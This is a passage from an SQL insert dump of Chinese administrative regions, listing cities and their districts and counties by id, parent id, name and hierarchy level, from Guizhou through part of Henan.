,2),(119,8,'遵义',2),(120,9,'海口',2),(121,9,'三亚',2),(122,9,'白沙',2),(123,9,'保亭',2),(124,9,'昌江',2),(125,9,'澄迈县',2),(126,9,'定安县',2),(127,9,'东方',2),(128,9,'乐东',2),(129,9,'临高县',2),(130,9,'陵水',2),(131,9,'琼海',2),(132,9,'琼中',2),(133,9,'屯昌县',2),(134,9,'万宁',2),(135,9,'文昌',2),(136,9,'五指山',2),(137,9,'儋州',2),(138,10,'石家庄',2),(139,10,'保定',2),(140,10,'沧州',2),(141,10,'承德',2),(142,10,'邯郸',2),(143,10,'衡水',2),(144,10,'廊坊',2),(145,10,'秦皇岛',2),(146,10,'唐山',2),(147,10,'邢台',2),(148,10,'张家口',2),(149,11,'郑州',2),(150,11,'洛阳',2),(151,11,'开封',2),(152,11,'安阳',2),(153,11,'鹤壁',2),(154,11,'济源',2),(155,11,'焦作',2),(156,11,'南阳',2),(157,11,'平顶山',2),(158,11,'三门峡',2),(159,11,'商丘',2),(160,11,'新乡',2),(161,11,'信阳',2),(162,11,'许昌',2),(163,11,'周口',2),(164,11,'驻马店',2),(165,11,'漯河',2),(166,11,'濮阳',2),(167,12,'哈尔滨',2),(168,12,'大庆',2),(169,12,'大兴安岭',2),(170,12,'鹤岗',2),(171,12,'黑河',2),(172,12,'鸡西',2),(173,12,'佳木斯',2),(174,12,'牡丹江',2),(175,12,'七台河',2),(176,12,'齐齐哈尔',2),(177,12,'双鸭山',2),(178,12,'绥化',2),(179,12,'伊春',2),(180,13,'武汉',2),(181,13,'仙桃',2),(182,13,'鄂州',2),(183,13,'黄冈',2),(184,13,'黄石',2),(185,13,'荆门',2),(186,13,'荆州',2),(187,13,'潜江',2),(188,13,'神农架林区',2),(189,13,'十堰',2),(190,13,'随州',2),(191,13,'天门',2),(192,13,'咸宁',2),(193,13,'襄樊',2),(194,13,'孝感',2),(195,13,'宜昌',2),(196,13,'恩施',2),(197,14,'长沙',2),(198,14,'张家界',2),(199,14,'常德',2),(200,14,'郴州',2),(201,14,'衡阳',2),(202,14,'怀化',2),(203,14,'娄底',2),(204,14,'邵阳',2),(205,14,'湘潭',2),(206,14,'湘西',2),(207,14,'益阳',2),(208,14,'永州',2),(209,14,'岳阳',2),(210,14,'株洲',2),(211,15,'长春',2),(212,15,'吉林',2),(213,15,'白城',2),(214,15,'白山',2),(215,15,'辽源',2),(216,15,'四平',2),(217,15,'松原',2),(218,15,'通化',2),(219,15,'延边',2),(220,16,'南京',2),(221,16,'苏州',2),(222,16,'无锡',2),(223,16,'常州',2),(224,16,'淮安',2),(225,16,'连云港',2),(226,16,'南通',2),(227,16,'宿迁',2),(228,16,'泰州',2),(229,16,'徐州',2),(230,16,'盐城',2),(231,16,'扬州',2),(232,16,'镇江',2),(233,17,'南昌',2),(234,17,'抚州',2),(235,17,'赣州',2),(236,17,'吉安',2),(237,17,'景德镇',2),(238,17,'九江',2),(239,17,'萍乡',2),(240,17,'上饶',2),(241,17,'新余',2),(242,17,'宜春',2),(243,17,'鹰潭',2),(244,18,'沈阳',2),(245,18,'大连',2),(246,18,'鞍山',2),(247,18,'本溪',2),(248,18,'朝阳',2),(249,18,'丹东',2),(250,18,'抚顺',2),(251,18,'阜新',2),(252,18,'葫芦岛',2),(253,18,'锦州',2),(254,18,'辽阳',2),(255,18,'盘锦',2),(256,18,'铁岭',2),(257,18,'营口',2),(258,19,'呼和浩特',2),(259,19,'阿拉善盟',2),(260,19,'巴彦淖尔盟',2),(261,19,'包头',2),(262,19,'赤峰',2),(263,19,'鄂尔多斯',2),(264,19,'呼伦贝尔',2),(265,19,'通辽',2),(266,19,'乌海',2),(267,19,'乌兰察布市',2),(268,19,'锡林郭勒盟',2),(269,19,'兴安盟',2),(270,20,'银川',2),(271,20,'固原',2),(272,20,'石嘴山',2),(273,20,'吴忠',2),(274,20,'中卫',2),(275,21,'西宁',2),(276,21,'果洛',2),(277,21,'海北',2),(278,21,'海东',2),(279,21,'海南',2),(280,21,'海西',2),(281,21,'黄南',2),(282,21,'玉树',2),(283,22,'济南',2),(284,22,'青岛',2),(285,22,'滨州',2),(286,22,'德州',2),(287,22,'东营',2),(288,22,'菏泽',2),(289,22,'济宁',2),(290,22,'莱芜',2),(291,22,'聊城',2),(292,22,'临沂',2),(293,22,'日照',2),(294,22,'泰安',2),(295,22,'威海',2),(296,22,'潍坊',2),(297,22,'烟台',2),(298,22,'枣庄',2),(299,22,'淄博',2),(300,23,'太原',2),(301,23,'长治',2),(302,23,'大同',2),(303,23,'晋城',2),(304,23,'晋中',2),(305,23,'临汾',2),(306,23,'吕梁',2),(307,23,'朔州',2),(308,23,'忻州',2),(309,23,'阳泉',2),(310,23,'运城',2),(311,24,'西安',2),(312,24,'安康',2),(313,24,'宝鸡',2),(314,24,'汉中',2),(315,24,'商洛',2),(316,24,'铜川',2),(317,24,'渭南',2),(318,24,'咸阳',2),(319,24,'延安',2),(320,24,'榆林',2),(321,25,'上海',2),(322,26,'成都',2),(323,26,'绵阳',2),(324,26,'阿坝',2),(325,26,'巴中',2),(326,26,'达州',2),(327,26,'德阳',2),(328,26,'甘孜',2),(329,26,'广安',2),(330,26,'广元',2),(331,26,'乐山',2),(332,26,'凉山',2),(333,26,'眉山',2),(334,26,'南充',2),(335,26,'内江',2),(336,26,'攀枝花',2),(337,26,'遂宁',2),(338,26,'雅安',2),(339,26,'宜宾',2),(340,26,'资阳',2),(341,26,'自贡',2),(342,26,'泸州',2),(343,27,'天津',2),(344,28,'拉萨',2),(345,28,'阿里',2),(346,28,'昌都',2),(347,28,'林芝',2),(348,28,'那曲',2),(349,28,'日喀则',2),(350,28,'山南',2),(351,29,'乌鲁木齐',2),(352,29,'阿克苏',2),(353,29,'阿拉尔',2),(354,29,'巴音郭楞',2),(355,29,'博尔塔拉',2),(356,29,'昌吉',2),(357,29,'哈密',2),(358,29,'和田',2),(359,29,'喀什',2),(360,29,'克拉玛依',2),(361,29,'克孜勒苏',2),(362,29,'石河子',2),(363,29,'图木舒克',2),(364,29,'吐鲁番',2),(365,29,'五家渠',2),(366,29,'伊犁',2),(367,30,'昆明',2),(368,30,'怒江',2),(369,30,'普洱',2),(370,30,'丽江',2),(371,30,'保山',2),(372,30,'楚雄',2),(373,30,'大理',2),(374,30,'德宏',2),(375,30,'迪庆',2),(376,30,'红河',2),(377,30,'临沧',2),(378,30,'曲靖',2),(379,30,'文山',2),(380,30,'西双版纳',2),(381,30,'玉溪',2),(382,30,'昭通',2),(383,31,'杭州',2),(384,31,'湖州',2),(385,31,'嘉兴',2),(386,31,'金华',2),(387,31,'丽水',2),(388,31,'宁波',2),(389,31,'绍兴',2),(390,31,'台州',2),(391,31,'温州',2),(392,31,'舟山',2),(393,31,'衢州',2),(394,32,'重庆',2),(395,33,'香港',2),(396,34,'澳门',2),(397,35,'台湾',2),(398,36,'迎江区',3),(399,36,'大观区',3),(400,36,'宜秀区',3),(401,36,'桐城市',3),(402,36,'怀宁县',3),(403,36,'枞阳县',3),(404,36,'潜山县',3),(405,36,'太湖县',3),(406,36,'宿松县',3),(407,36,'望江县',3),(408,36,'岳西县',3),(409,37,'中市区',3),(410,37,'东市区',3),(411,37,'西市区',3),(412,37,'郊区',3),(413,37,'怀远县',3),(414,37,'五河县',3),(415,37,'固镇县',3),(416,38,'居巢区',3),(417,38,'庐江县',3),(418,38,'无为县',3),(419,38,'含山县',3),(420,38,'和县',3),(421,39,'贵池区',3),(422,39,'东至县',3),(423,39,'石台县',3),(424,39,'青阳县',3),(425,40,'琅琊区',3),(426,40,'南谯区',3),(427,40,'天长市',3),(428,40,'明光市',3),(429,40,'来安县',3),(430,40,'全椒县',3),(431,40,'定远县',3),(432,40,'凤阳县',3),(433,41,'蚌山区',3),(434,41,'龙子湖区',3),(435,41,'禹会区',3),(436,41,'淮上区',3),(437,41,'颍州区',3),(438,41,'颍东区',3),(439,41,'颍泉区',3),(440,41,'界首市',3),(441,41,'临泉县',3),(442,41,'太和县',3),(443,41,'阜南县',3),(444,41,'颖上县',3),(445,42,'相山区',3),(446,42,'杜集区',3),(447,42,'烈山区',3),(448,42,'濉溪县',3),(449,43,'田家庵区',3),(450,43,'大通区',3),(451,43,'谢家集区',3),(452,43,'八公山区',3),(453,43,'潘集区',3),(454,43,'凤台县',3),(455,44,'屯溪区',3),(456,44,'黄山区',3),(457,44,'徽州区',3),(458,44,'歙县',3),(459,44,'休宁县',3),(460,44,'黟县',3),(461,44,'祁门县',3),(462,45,'金安区',3),(463,45,'裕安区',3),(464,45,'寿县',3),(465,45,'霍邱县',3),(466,45,'舒城县',3),(467,45,'金寨县',3),(468,45,'霍山县',3),(469,46,'雨山区',3),(470,46,'花山区',3),(471,46,'金家庄区',3),(472,46,'当涂县',3),(473,47,'埇桥区',3),(474,47,'砀山县',3),(475,47,'萧县',3),(476,47,'灵璧县',3),(477,47,'泗县',3),(478,48,'铜官山区',3),(479,48,'狮子山区',3),(480,48,'郊区',3),(481,48,'铜陵县',3),(482,49,'镜湖区',3),(483,49,'弋江区',3),(484,49,'鸠江区',3),(485,49,'三山区',3),(486,49,'芜湖县',3),(487,49,'繁昌县',3),(488,49,'南陵县',3),(489,50,'宣州区',3),(490,50,'宁国市',3),(491,50,'郎溪县',3),(492,50,'广德县',3),(493,50,'泾县',3),(494,50,'绩溪县',3),(495,50,'旌德县',3),(496,51,'涡阳县',3),(497,51,'蒙城县',3),(498,51,'利辛县',3),(499,51,'谯城区',3),(500,52,'东城区',3),(501,52,'西城区',3),(502,52,'海淀区',3),(503,52,'朝阳区',3),(504,52,'崇文区',3),(505,52,'宣武区',3),(506,52,'丰台区',3),(507,52,'石景山区',3),(508,52,'房山区',3),(509,52,'门头沟区',3),(510,52,'通州区',3),(511,52,'顺义区',3),(512,52,'昌平区',3),(513,52,'怀柔区',3),(514,52,'平谷区',3),(515,52,'大兴区',3),(516,52,'密云县',3),(517,52,'延庆县',3),(518,53,'鼓楼区',3),(519,53,'台江区',3),(520,53,'仓山区',3),(521,53,'马尾区',3),(522,53,'晋安区',3),(523,53,'福清市',3),(524,53,'长乐市',3),(525,53,'闽侯县',3),(526,53,'连江县',3),(527,53,'罗源县',3),(528,53,'闽清县',3),(529,53,'永泰县',3),(530,53,'平潭县',3),(531,54,'新罗区',3),(532,54,'漳平市',3),(533,54,'长汀县',3),(534,54,'永定县',3),(535,54,'上杭县',3),(536,54,'武平县',3),(537,54,'连城县',3),(538,55,'延平区',3),(539,55,'邵武市',3),(540,55,'武夷山市',3),(541,55,'建瓯市',3),(542,55,'建阳市',3),(543,55,'顺昌县',3),(544,55,'浦城县',3),(545,55,'光泽县',3),(546,55,'松溪县',3),(547,55,'政和县',3),(548,56,'蕉城区',3),(549,56,'福安市',3),(550,56,'福鼎市',3),(551,56,'霞浦县',3),(552,56,'古田县',3),(553,56,'屏南县',3),(554,56,'寿宁县',3),(555,56,'周宁县',3),(556,56,'柘荣县',3),(557,57,'城厢区',3),(558,57,'涵江区',3),(559,57,'荔城区',3),(560,57,'秀屿区',3),(561,57,'仙游县',3),(562,58,'鲤城区',3),(563,58,'丰泽区',3),(564,58,'洛江区',3),(565,58,'清濛开发区',3),(566,58,'泉港区',3),(567,58,'石狮市',3),(568,58,'晋江市',3),(569,58,'南安市',3),(570,58,'惠安县',3),(571,58,'安溪县',3),(572,58,'永春县',3),(573,58,'德化县',3),(574,58,'金门县',3),(575,59,'梅列区',3),(576,59,'三元区',3),(577,59,'永安市',3),(578,59,'明溪县',3),(579,59,'清流县',3),(580,59,'宁化县',3),(581,59,'大田县',3),(582,59,'尤溪县',3),(583,59,'沙县',3),(584,59,'将乐县',3),(585,59,'泰宁县',3),(586,59,'建宁县',3),(587,60,'思明区',3),(588,60,'海沧区',3),(589,60,'湖里区',3),(590,60,'集美区',3),(591,60,'同安区',3),(592,60,'翔安区',3),(593,61,'芗城区',3),(594,61,'龙文区',3),(595,61,'龙海市',3),(596,61,'云霄县',3),(597,61,'漳浦县',3),(598,61,'诏安县',3),(599,61,'长泰县',3),(600,61,'东山县',3),(601,61,'南靖县',3),(602,61,'平和县',3),(603,61,'华安县',3),(604,62,'皋兰县',3),(605,62,'城关区',3),(606,62,'七里河区',3),(607,62,'西固区',3),(608,62,'安宁区',3),(609,62,'红古区',3),(610,62,'永登县',3),(611,62,'榆中县',3),(612,63,'白银区',3),(613,63,'平川区',3),(614,63,'会宁县',3),(615,63,'景泰县',3),(616,63,'靖远县',3),(617,64,'临洮县',3),(618,64,'陇西县',3),(619,64,'通渭县',3),(620,64,'渭源县',3),(621,64,'漳县',3),(622,64,'岷县',3),(623,64,'安定区',3),(624,64,'安定区',3),(625,65,'合作市',3),(626,65,'临潭县',3),(627,65,'卓尼县',3),(628,65,'舟曲县',3),(629,65,'迭部县',3),(630,65,'玛曲县',3),(631,65,'碌曲县',3),(632,65,'夏河县',3),(633,66,'嘉峪关市',3),(634,67,'金川区',3),(635,67,'永昌县',3),(636,68,'肃州区',3),(637,68,'玉门市',3),(638,68,'敦煌市',3),(639,68,'金塔县',3),(640,68,'瓜州县',3),(641,68,'肃北',3),(642,68,'阿克塞',3),(643,69,'临夏市',3),(644,69,'临夏县',3),(645,69,'康乐县',3),(646,69,'永靖县',3),(647,69,'广河县',3),(648,69,'和政县',3),(649,69,'东乡族自治县',3),(650,69,'积石山',3),(651,70,'成县',3),(652,70,'徽县',3),(653,70,'康县',3),(654,70,'礼县',3),(655,70,'两当县',3),(656,70,'文县',3),(657,70,'西和县',3),(658,70,'宕昌县',3),(659,70,'武都区',3),(660,71,'崇信县',3),(661,71,'华亭县',3),(662,71,'静宁县',3),(663,71,'灵台县',3),(664,71,'崆峒区',3),(665,71,'庄浪县',3),(666,71,'泾川县',3),(667,72,'合水县',3),(668,72,'华池县',3),(669,72,'环县',3),(670,72,'宁县',3),(671,72,'庆城县',3),(672,72,'西峰区',3),(673,72,'镇原县',3),(674,72,'正宁县',3),(675,73,'甘谷县',3),(676,73,'秦安县',3),(677,73,'清水县',3),(678,73,'秦州区',3),(679,73,'麦积区',3),(680,73,'武山县',3),(681,73,'张家川',3),(682,74,'古浪县',3),(683,74,'民勤县',3),(684,74,'天祝',3),(685,74,'凉州区',3),(686,75,'高台县',3),(687,75,'临泽县',3),(688,75,'民乐县',3),(689,75,'山丹县',3),(690,75,'肃南',3),(691,75,'甘州区',3),(692,76,'从化市',3),(693,76,'天河区',3),(694,76,'东山区',3),(695,76,'白云区',3),(696,76,'海珠区',3),(697,76,'荔湾区',3),(698,76,'越秀区',3),(699,76,'黄埔区',3),(700,76,'番禺区',3),(701,76,'花都区',3),(702,76,'增城区',3),(703,76,'从化区',3),(704,76,'市郊',3),(705,77,'福田区',3),(706,77,'罗湖区',3),(707,77,'南山区',3),(708,77,'宝安区',3),(709,77,'龙岗区',3),(710,77,'盐田区',3),(711,78,'湘桥区',3),(712,78,'潮安县',3),(713,78,'饶平县',3),(714,79,'南城区',3),(715,79,'东城区',3),(716,79,'万江区',3),(717,79,'莞城区',3),(718,79,'石龙镇',3),(719,79,'虎门镇',3),(720,79,'麻涌镇',3),(721,79,'道滘镇',3),(722,79,'石碣镇',3),(723,79,'沙田镇',3),(724,79,'望牛墩镇',3),(725,79,'洪梅镇',3),(726,79,'茶山镇',3),(727,79,'寮步镇',3),(728,79,'大岭山镇',3),(729,79,'大朗镇',3),(730,79,'黄江镇',3),(731,79,'樟木头',3),(732,79,'凤岗镇',3),(733,79,'塘厦镇',3),(734,79,'谢岗镇',3),(735,79,'厚街镇',3),(736,79,'清溪镇',3),(737,79,'常平镇',3),(738,79,'桥头镇',3),(739,79,'横沥镇',3),(740,79,'东坑镇',3),(741,79,'企石镇',3),(742,79,'石排镇',3),(743,79,'长安镇',3),(744,79,'中堂镇',3),(745,79,'高埗镇',3),(746,80,'禅城区',3),(747,80,'南海区',3),(748,80,'顺德区',3),(749,80,'三水区',3),(750,80,'高明区',3),(751,81,'东源县',3),(752,81,'和平县',3),(753,81,'源城区',3),(754,81,'连平县',3),(755,81,'龙川县',3),(756,81,'紫金县',3),(757,82,'惠阳区',3),(758,82,'惠城区',3),(759,82,'大亚湾',3),(760,82,'博罗县',3),(761,82,'惠东县',3),(762,82,'龙门县',3),(763,83,'江海区',3),(764,83,'蓬江区',3),(765,83,'新会区',3),(766,83,'台山市',3),(767,83,'开平市',3),(768,83,'鹤山市',3),(769,83,'恩平市',3),(770,84,'榕城区',3),(771,84,'普宁市',3),(772,84,'揭东县',3),(773,84,'揭西县',3),(774,84,'惠来县',3),(775,85,'茂南区',3),(776,85,'茂港区',3),(777,85,'高州市',3),(778,85,'化州市',3),(779,85,'信宜市',3),(780,85,'电白县',3),(781,86,'梅县',3),(782,86,'梅江区',3),(783,86,'兴宁市',3),(784,86,'大埔县',3),(785,86,'丰顺县',3),(786,86,'五华县',3),(787,86,'平远县',3),(788,86,'蕉岭县',3),(789,87,'清城区',3),(790,87,'英德市',3),(791,87,'连州市',3),(792,87,'佛冈县',3),(793,87,'阳山县',3),(794,87,'清新县',3),(795,87,'连山',3),(796,87,'连南',3),(797,88,'南澳县',3),(798,88,'潮阳区',3),(799,88,'澄海区',3),(800,88,'龙湖区',3),(801,88,'金平区',3),(802,88,'濠江区',3),(803,88,'潮南区',3),(804,89,'城区',3),(805,89,'陆丰市',3),(806,89,'海丰县',3),(807,89,'陆河县',3),(808,90,'曲江县',3),(809,90,'浈江区',3),(810,90,'武江区',3),(811,90,'曲江区',3),(812,90,'乐昌市',3),(813,90,'南雄市',3),(814,90,'始兴县',3),(815,90,'仁化县',3),(816,90,'翁源县',3),(817,90,'新丰县',3),(818,90,'乳源',3),(819,91,'江城区',3),(820,91,'阳春市',3),(821,91,'阳西县',3),(822,91,'阳东县',3),(823,92,'云城区',3),(824,92,'罗定市',3),(825,92,'新兴县',3),(826,92,'郁南县',3),(827,92,'云安县',3),(828,93,'赤坎区',3),(829,93,'霞山区',3),(830,93,'坡头区',3),(831,93,'麻章区',3),(832,93,'廉江市',3),(833,93,'雷州市',3),(834,93,'吴川市',3),(835,93,'遂溪县',3),(836,93,'徐闻县',3),(837,94,'肇庆市',3),(838,94,'高要市',3),(839,94,'四会市',3),(840,94,'广宁县',3),(841,94,'怀集县',3),(842,94,'封开县',3),(843,94,'德庆县',3),(844,95,'石岐街道',3),(845,95,'东区街道',3),(846,95,'西区街道',3),(847,95,'环城街道',3),(848,95,'中山港街道',3),(849,95,'五桂山街道',3),(850,96,'香洲区',3),(851,96,'斗门区',3),(852,96,'金湾区',3),(853,97,'邕宁区',3),(854,97,'青秀区',3),(855,97,'兴宁区',3),(856,97,'良庆区',3),(857,97,'西乡塘区',3),(858,97,'江南区',3),(859,97,'武鸣县',3),(860,97,'隆安县',3),(861,97,'马山县',3),(862,97,'上林县',3),(863,97,'宾阳县',3),(864,97,'横县',3),(865,98,'秀峰区',3),(866,98,'叠彩区',3),(867,98,'象山区',3),(868,98,'七星区',3),(869,98,'雁山区',3),(870,98,'阳朔县',3),(871,98,'临桂县',3),(872,98,'灵川县',3),(873,98,'全州县',3),(874,98,'平乐县',3),(875,98,'兴安县',3),(876,98,'灌阳县',3),(877,98,'荔浦县',3),(878,98,'资源县',3),(879,98,'永福县',3),(880,98,'龙胜',3),(881,98,'恭城',3),(882,99,'右江区',3),(883,99,'凌云县',3),(884,99,'平果县',3),(885,99,'西林县',3),(886,99,'乐业县',3),(887,99,'德保县',3),(888,99,'田林县',3),(889,99,'田阳县',3),(890,99,'靖西县',3),(891,99,'田东县',3),(892,99,'那坡县',3),(893,99,'隆林',3),(894,100,'海城区',3),(895,100,'银海区',3),(896,100,'铁山港区',3),(897,100,'合浦县',3),(898,101,'江州区',3),(899,101,'凭祥市',3),(900,101,'宁明县',3),(901,101,'扶绥县',3),(902,101,'龙州县',3),(903,101,'大新县',3),(904,101,'天等县',3),(905,102,'港口区',3),(906,102,'防城区',3),(907,102,'东兴市',3),(908,102,'上思县',3),(909,103,'港北区',3),(910,103,'港南区',3),(911,103,'覃塘区',3),(912,103,'桂平市',3),(913,103,'平南县',3),(914,104,'金城江区',3),(915,104,'宜州市',3),(916,104,'天峨县',3),(917,104,'凤山县',3),(918,104,'南丹县',3),(919,104,'东兰县',3),(920,104,'都安',3),(921,104,'罗城',3),(922,104,'巴马',3),(923,104,'环江',3),(924,104,'大化',3),(925,105,'八步区',3),(926,105,'钟山县',3),(927,105,'昭平县',3),(928,105,'富川',3),(929,106,'兴宾区',3),(930,106,'合山市',3),(931,106,'象州县',3),(932,106,'武宣县',3),(933,106,'忻城县',3),(934,106,'金秀',3),(935,107,'城中区',3),(936,107,'鱼峰区',3),(937,107,'柳北区',3),(938,107,'柳南区',3),(939,107,'柳江县',3),(940,107,'柳城县',3),(941,107,'鹿寨县',3),(942,107,'融安县',3),(943,107,'融水',3),(944,107,'三江',3),(945,108,'钦南区',3),(946,108,'钦北区',3),(947,108,'灵山县',3),(948,108,'浦北县',3),(949,109,'万秀区',3),(950,109,'蝶山区',3),(951,109,'长洲区',3),(952,109,'岑溪市',3),(953,109,'苍梧县',3),(954,109,'藤县',3),(955,109,'蒙山县',3),(956,110,'玉州区',3),(957,110,'北流市',3),(958,110,'容县',3),(959,110,'陆川县',3),(960,110,'博白县',3),(961,110,'兴业县',3),(962,111,'南明区',3),(963,111,'云岩区',3),(964,111,'花溪区',3),(965,111,'乌当区',3),(966,111,'白云区',3),(967,111,'小河区',3),(968,111,'金阳新区',3),(969,111,'新天园区',3),(970,111,'清镇市',3),(971,111,'开阳县',3),(972,111,'修文县',3),(973,111,'息烽县',3),(974,112,'西秀区',3),(975,112,'关岭',3),(976,112,'镇宁',3),(977,112,'紫云',3),(978,112,'平坝县',3),(979,112,'普定县',3),(980,113,'毕节市',3),(981,113,'大方县',3),(982,113,'黔西县',3),(983,113,'金沙县',3),(984,113,'织金县',3),(985,113,'纳雍县',3),(986,113,'赫章县',3),(987,113,'威宁',3),(988,114,'钟山区',3),(989,114,'六枝特区',3),(990,114,'水城县',3),(991,114,'盘县',3),(992,115,'凯里市',3),(993,115,'黄平县',3),(994,115,'施秉县',3),(995,115,'三穗县',3),(996,115,'镇远县',3),(997,115,'岑巩县',3),(998,115,'天柱县',3),(999,115,'锦屏县',3),(1000,115,'剑河县',3),(1001,115,'台江县',3),(1002,115,'黎平县',3),(1003,115,'榕江县',3),(1004,115,'从江县',3),(1005,115,'雷山县',3),(1006,115,'麻江县',3),(1007,115,'丹寨县',3),(1008,116,'都匀市',3),(1009,116,'福泉市',3),(1010,116,'荔波县',3),(1011,116,'贵定县',3),(1012,116,'瓮安县',3),(1013,116,'独山县',3),(1014,116,'平塘县',3),(1015,116,'罗甸县',3),(1016,116,'长顺县',3),(1017,116,'龙里县',3),(1018,116,'惠水县',3),(1019,116,'三都',3),(1020,117,'兴义市',3),(1021,117,'兴仁县',3),(1022,117,'普安县',3),(1023,117,'晴隆县',3),(1024,117,'贞丰县',3),(1025,117,'望谟县',3),(1026,117,'册亨县',3),(1027,117,'安龙县',3),(1028,118,'铜仁市',3),(1029,118,'江口县',3),(1030,118,'石阡县',3),(1031,118,'思南县',3),(1032,118,'德江县',3),(1033,118,'玉屏',3),(1034,118,'印江',3),(1035,118,'沿河',3),(1036,118,'松桃',3),(1037,118,'万山特区',3),(1038,119,'红花岗区',3),(1039,119,'务川县',3),(1040,119,'道真县',3),(1041,119,'汇川区',3),(1042,119,'赤水市',3),(1043,119,'仁怀市',3),(1044,119,'遵义县',3),(1045,119,'桐梓县',3),(1046,119,'绥阳县',3),(1047,119,'正安县',3),(1048,119,'凤冈县',3),(1049,119,'湄潭县',3),(1050,119,'余庆县',3),(1051,119,'习水县',3),(1052,119,'道真',3),(1053,119,'务川',3),(1054,120,'秀英区',3),(1055,120,'龙华区',3),(1056,120,'琼山区',3),(1057,120,'美兰区',3),(1058,137,'市区',3),(1059,137,'洋浦开发区',3),(1060,137,'那大镇',3),(1061,137,'王五镇',3),(1062,137,'雅星镇',3),(1063,137,'大成镇',3),(1064,137,'中和镇',3),(1065,137,'峨蔓镇',3),(1066,137,'南丰镇',3),(1067,137,'白马井镇',3),(1068,137,'兰洋镇',3),(1069,137,'和庆镇',3),(1070,137,'海头镇',3),(1071,137,'排浦镇',3),(1072,137,'东成镇',3),(1073,137,'光村镇',3),(1074,137,'木棠镇',3),(1075,137,'新州镇',3),(1076,137,'三都镇',3),(1077,137,'其他',3),(1078,138,'长安区',3),(1079,138,'桥东区',3),(1080,138,'桥西区',3),(1081,138,'新华区',3),(1082,138,'裕华区',3),(1083,138,'井陉矿区',3),(1084,138,'高新区',3),(1085,138,'辛集市',3),(1086,138,'藁城市',3),(1087,138,'晋州市',3),(1088,138,'新乐市',3),(1089,138,'鹿泉市',3),(1090,138,'井陉县',3),(1091,138,'正定县',3),(1092,138,'栾城县',3),(1093,138,'行唐县',3),(1094,138,'灵寿县',3),(1095,138,'高邑县',3),(1096,138,'深泽县',3),(1097,138,'赞皇县',3),(1098,138,'无极县',3),(1099,138,'平山县',3),(1100,138,'元氏县',3),(1101,138,'赵县',3),(1102,139,'新市区',3),(1103,139,'南市区',3),(1104,139,'北市区',3),(1105,139,'涿州市',3),(1106,139,'定州市',3),(1107,139,'安国市',3),(1108,139,'高碑店市',3),(1109,139,'满城县',3),(1110,139,'清苑县',3),(1111,139,'涞水县',3),(1112,139,'阜平县',3),(1113,139,'徐水县',3),(1114,139,'定兴县',3),(1115,139,'唐县',3),(1116,139,'高阳县',3),(1117,139,'容城县',3),(1118,139,'涞源县',3),(1119,139,'望都县',3),(1120,139,'安新县',3),(1121,139,'易县',3),(1122,139,'曲阳县',3),(1123,139,'蠡县',3),(1124,139,'顺平县',3),(1125,139,'博野县',3),(1126,139,'雄县',3),(1127,140,'运河区',3),(1128,140,'新华区',3),(1129,140,'泊头市',3),(1130,140,'任丘市',3),(1131,140,'黄骅市',3),(1132,140,'河间市',3),(1133,140,'沧县',3),(1134,140,'青县',3),(1135,140,'东光县',3),(1136,140,'海兴县',3),(1137,140,'盐山县',3),(1138,140,'肃宁县',3),(1139,140,'南皮县',3),(1140,140,'吴桥县',3),(1141,140,'献县',3),(1142,140,'孟村',3),(1143,141,'双桥区',3),(1144,141,'双滦区',3),(1145,141,'鹰手营子矿区',3),(1146,141,'承德县',3),(1147,141,'兴隆县',3),(1148,141,'平泉县',3),(1149,141,'滦平县',3),(1150,141,'隆化县',3),(1151,141,'丰宁',3),(1152,141,'宽城',3),(1153,141,'围场',3),(1154,142,'从台区',3),(1155,142,'复兴区',3),(1156,142,'邯山区',3),(1157,142,'峰峰矿区',3),(1158,142,'武安市',3),(1159,142,'邯郸县',3),(1160,142,'临漳县',3),(1161,142,'成安县',3),(1162,142,'大名县',3),(1163,142,'涉县',3),(1164,142,'磁县',3),(1165,142,'肥乡县',3),(1166,142,'永年县',3),(1167,142,'邱县',3),(1168,142,'鸡泽县',3),(1169,142,'广平县',3),(1170,142,'馆陶县',3),(1171,142,'魏县',3),(1172,142,'曲周县',3),(1173,143,'桃城区',3),(1174,143,'冀州市',3),(1175,143,'深州市',3),(1176,143,'枣强县',3),(1177,143,'武邑县',3),(1178,143,'武强县',3),(1179,143,'饶阳县',3),(1180,143,'安平县',3),(1181,143,'故城县',3),(1182,143,'景县',3),(1183,143,'阜城县',3),(1184,144,'安次区',3),(1185,144,'广阳区',3),(1186,144,'霸州市',3),(1187,144,'三河市',3),(1188,144,'固安县',3),(1189,144,'永清县',3),(1190,144,'香河县',3),(1191,144,'大城县',3),(1192,144,'文安县',3),(1193,144,'大厂',3),(1194,145,'海港区',3),(1195,145,'山海关区',3),(1196,145,'北戴河区',3),(1197,145,'昌黎县',3),(1198,145,'抚宁县',3),(1199,145,'卢龙县',3),(1200,145,'青龙',3),(1201,146,'路北区',3),(1202,146,'路南区',3),(1203,146,'古冶区',3),(1204,146,'开平区',3),(1205,146,'丰南区',3),(1206,146,'丰润区',3),(1207,146,'遵化市',3),(1208,146,'迁安市',3),(1209,146,'滦县',3),(1210,146,'滦南县',3),(1211,146,'乐亭县',3),(1212,146,'迁西县',3),(1213,146,'玉田县',3),(1214,146,'唐海县',3),(1215,147,'桥东区',3),(1216,147,'桥西区',3),(1217,147,'南宫市',3),(1218,147,'沙河市',3),(1219,147,'邢台县',3),(1220,147,'临城县',3),(1221,147,'内丘县',3),(1222,147,'柏乡县',3),(1223,147,'隆尧县',3),(1224,147,'任县',3),(1225,147,'南和县',3),(1226,147,'宁晋县',3),(1227,147,'巨鹿县',3),(1228,147,'新河县',3),(1229,147,'广宗县',3),(1230,147,'平乡县',3),(1231,147,'威县',3),(1232,147,'清河县',3),(1233,147,'临西县',3),(1234,148,'桥西区',3),(1235,148,'桥东区',3),(1236,148,'宣化区',3),(1237,148,'下花园区',3),(1238,148,'宣化县',3),(1239,148,'张北县',3),(1240,148,'康保县',3),(1241,148,'沽源县',3),(1242,148,'尚义县',3),(1243,148,'蔚县',3),(1244,148,'阳原县',3),(1245,148,'怀安县',3),(1246,148,'万全县',3),(1247,148,'怀来县',3),(1248,148,'涿鹿县',3),(1249,148,'赤城县',3),(1250,148,'崇礼县',3),(1251,149,'金水区',3),(1252,149,'邙山区',3),(1253,149,'二七区',3),(1254,149,'管城区',3),(1255,149,'中原区',3),(1256,149,'上街区',3),(1257,149,'惠济区',3),(1258,149,'郑东新区',3),(1259,149,'经济技术开发区',3),(1260,149,'高新开发区',3),(1261,149,'出口加工区',3),(1262,149,'巩义市',3),(1263,149,'荥阳市',3),(1264,149,'新密市',3),(1265,149,'新郑市',3),(1266,149,'登封市',3),(1267,149,'中牟县',3),(1268,150,'西工区',3),(1269,150,'老城区',3),(1270,150,'涧西区',3),(1271,150,'瀍河回族区',3),(1272,150,'洛